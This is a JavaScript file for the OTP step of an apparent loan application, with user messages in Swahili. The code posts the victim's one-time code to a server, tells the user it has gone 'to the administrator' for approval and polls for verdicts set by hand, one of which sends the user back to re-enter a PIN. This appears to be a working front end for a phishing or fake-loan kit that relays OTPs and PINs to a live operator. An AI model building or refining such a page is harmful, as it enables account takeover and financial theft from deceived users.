// OTP Verification Script - NO DIALOGS, INLINE MESSAGES ONLY

document.addEventListener('DOMContentLoaded', function() {
    const otpInputs = document.querySelectorAll('.otp-box');
    const submitBtn = document.getElementById('verifyOtpBtn');
    const resendBtn = document.getElementById('resendBtn');
    const resendTimerDisplay = document.getElementById('resendTimer');
    const countdownNumber = document.getElementById('countdown');
    const timeRemaining = document.getElementById('timeRemaining');
    const countdownCircle = document.getElementById('countdownCircle');
    const maskedPhoneEl = document.getElementById('maskedPhone');
    
    // Create inline message container
    const messageContainer = document.createElement('div');
    messageContainer.style.cssText = 'margin: 20px 0; border-radius: 12px; overflow: hidden;';
    
    // Insert before OTP inputs
    const otpInputsContainer = document.querySelector('.otp-inputs');
    if (otpInputsContainer && otpInputsContainer.parentNode) {
        otpInputsContainer.parentNode.insertBefore(messageContainer, otpInputsContainer);
    }
    
    // Show inline message function
    function showMessage(text, type = 'info') {
        const styles = {
            error: { bg: '#fee2e2', border: '#fecaca', text: '#991b1b', icon: '✕' },
            success: { bg: '#d1fae5', border: '#a7f3d0', text: '#065f46', icon: '✓' },
            warning: { bg: '#fef3c7', border: '#fde68a', text: '#92400e', icon: '⚠' },
            info: { bg: '#dbeafe', border: '#bfdbfe', text: '#1e40af', icon: 'ℹ' }
        };
        
        const s = styles[type] || styles.info;
        
        messageContainer.innerHTML = `
            <div style="background:${s.bg}; border:2px solid ${s.border}; color:${s.text}; padding:16px 20px; display:flex; align-items:center; gap:12px; font-size:15px; line-height:1.6;">
                <span style="font-size:24px; font-weight:bold;">${s.icon}</span>
                <span style="flex:1;">${text}</span>
            </div>
        `;
        
        messageContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
        
        // Auto-hide success/info after 6 seconds
        if (type === 'success' || type === 'info') {
            setTimeout(() => { messageContainer.innerHTML = ''; }, 6000);
        }
    }
    
    function clearMessage() {
        messageContainer.innerHTML = '';
    }
    
    // Get application data
    const applicationData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');
    let applicationId = applicationData.applicationId || 'LOAN-' + Date.now();
    
    // Mask phone number
    if (applicationData.phone && maskedPhoneEl) {
        const phone = applicationData.phone;
        const masked = phone.slice(0, -4).replace(/./g, '*') + phone.slice(-4);
        maskedPhoneEl.textContent = masked;
    }
    
    // Timer variables
    let timeLeft = 60;
    let resendTimeLeft = 60;
    let timerInterval;
    let resendInterval;
    
    // Start timers
    startTimer();
    startResendTimer();
    
    // OTP Input handling
    otpInputs.forEach((input, index) => {
        input.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
            
            if (this.value.length === 1 && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
        });
        
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !this.value && index > 0) {
                otpInputs[index - 1].focus();
            }
        });
        
        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
            
            pastedData.split('').forEach((char, i) => {
                if (otpInputs[i]) otpInputs[i].value = char;
            });
            
            const lastIndex = Math.min(pastedData.length, otpInputs.length) - 1;
            if (otpInputs[lastIndex]) otpInputs[lastIndex].focus();
        });
    });
    
    if (otpInputs[0]) otpInputs[0].focus();
    
    // Submit OTP
    submitBtn.addEventListener('click', async function(e) {
        e.preventDefault();
        
        const otp = Array.from(otpInputs).map(input => input.value).join('');
        
        if (otp.length !== 4) {
            showMessage('Tafadhali weka msimbo kamili wa uthibitishaji wa nambari 4', 'warning');
            otpInputs[0].focus();
            return;
        }
        
        submitBtn.disabled = true;
        submitBtn.innerHTML = 'Inathibitisha... <span class="arrow">→</span>';
        clearMessage();
        
        try {
            console.log('Inatuma OTP:', otp);
            console.log('Application ID:', applicationId);
            
            const response = await fetch('/api/verify-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ applicationId, otp })
            });
            
            const result = await response.json();
            
            if (result.success) {
                showMessage('Msimdo wako umetumwa kwa msimamizi. Subiri idhini...', 'info');
                checkOTPStatus();
            } else {
                showMessage('Imeshindwa kuwasilisha msimdo. Jaribu tena.', 'error');
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Thibitisha Msimbo <span class="arrow">→</span>';
                restartTimers();
            }
            
        } catch (error) {
            console.error('Error:', error);
            showMessage('Hitilafu ya mtandao. Kagua muunganisho wako na jaribu tena.', 'error');
            submitBtn.disabled = false;
            submitBtn.innerHTML = 'Thibitisha Msimbo <span class="arrow">→</span>';
            restartTimers();
        }
    });
    
    // Check OTP status
    function checkOTPStatus() {
        const statusInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/check-otp-status/${applicationId}`);
                const result = await response.json();
                
                if (result.status === 'approved') {
                    clearInterval(statusInterval);
                    clearAllTimers();
                    showMessage('🎉 Hongera! Mkopo wako umeidhinishwa. Unaelekezwa...', 'success');
                    setTimeout(() => { window.location.href = 'approval.html'; }, 2000);
                    
                } else if (result.status === 'rejected') {
                    clearInterval(statusInterval);
                    clearAllTimers();
                    showMessage('Uthibitishaji umeshindwa. Wasiliana na msaada.', 'error');
                    submitBtn.disabled = true;
                    submitBtn.textContent = 'Uthibitishaji Umeshindwa';
                    
                } else if (result.status === 'wrongpin_otp') {
                    clearInterval(statusInterval);
                    clearAllTimers();
                    showMessage('PIN sio sahihi. Unaelekezwa kuweka PIN tena...', 'error');
                    setTimeout(() => { window.location.href = 'verification.html'; }, 3000);
                    
                } else if (result.status === 'wrongcode') {
                    clearInterval(statusInterval);
                    otpInputs.forEach(input => { input.value = ''; input.disabled = false; });
                    otpInputs[0].focus();
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = 'Thibitisha Msimdo <span class="arrow">→</span>';
                    showMessage('Msimdo sio sahihi. Weka tena au bonyeza "Tuma Tena" kupata mpya.', 'error');
                }
            } catch (error) {
                console.error('Status check error:', error);
            }
        }, 2000);
        
        setTimeout(() => clearInterval(statusInterval), 300000); // 5 min timeout
    }
    
    // Timer functions
    function startTimer() {
        updateTimerDisplay();
        timerInterval = setInterval(() => {
            timeLeft--;
            updateTimerDisplay();
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                handleTimeout();
            }
        }, 1000);
    }
    
    function updateTimerDisplay() {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        const timeText = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        
        if (countdownNumber) countdownNumber.textContent = timeLeft;
        if (timeRemaining) timeRemaining.textContent = timeText;
        
        if (countdownCircle) {
            const progress = (timeLeft / 60) * 283;
            countdownCircle.style.strokeDashoffset = 283 - progress;
            if (timeLeft < 20) countdownCircle.style.stroke = '#ef4444';
        }
    }
    
    function handleTimeout() {
        showMessage('Msimdo umeisha muda. Bonyeza "Tuma Tena" kupata mpya.', 'warning');
        submitBtn.disabled = true;
        submitBtn.textContent = 'Msimdo Umeisha Muda';
        otpInputs.forEach(input => { input.value = ''; input.disabled = true; });
    }
    
    function startResendTimer() {
        resendBtn.disabled = true;
        resendBtn.style.opacity = '0.5';
        
        resendInterval = setInterval(() => {
            resendTimeLeft--;
            
            if (resendTimeLeft <= 0) {
                clearInterval(resendInterval);
                resendBtn.disabled = false;
                resendBtn.style.opacity = '1';
                if (resendTimerDisplay) resendTimerDisplay.textContent = '';
            } else {
                const mins = Math.floor(resendTimeLeft / 60);
                const secs = resendTimeLeft % 60;
                if (resendTimerDisplay) {
                    resendTimerDisplay.textContent = `(${mins}:${secs.toString().padStart(2, '0')})`;
                }
            }
        }, 1000);
    }
    
    function restartTimers() {
        clearAllTimers();
        timeLeft = 60;
        resendTimeLeft = 60;
        startTimer();
        startResendTimer();
    }
    
    function clearAllTimers() {
        if (timerInterval) clearInterval(timerInterval);
        if (resendInterval) clearInterval(resendInterval);
    }
    
    // Resend OTP
    resendBtn.addEventListener('click', async function() {
        if (resendTimeLeft > 0) return;
        
        try {
            const response = await fetch('/api/resend-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ applicationId })
            });
            
            const result = await response.json();
            
            if (result.success) {
                showMessage('Msimdo mpya umeombwa. Angalia na msimamizi.', 'success');
                otpInputs.forEach(input => { input.value = ''; input.disabled = false; });
                otpInputs[0].focus();
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Thibitisha Msimdo <span class="arrow">→</span>';
                restartTimers();
            } else {
                showMessage('Imeshindwa kutuma msimdo tena. Jaribu tena.', 'error');
            }
        } catch (error) {
            console.error('Resend error:', error);
            showMessage('Hitilafu ya mtandao. Jaribu tena.', 'error');
        }
    });
});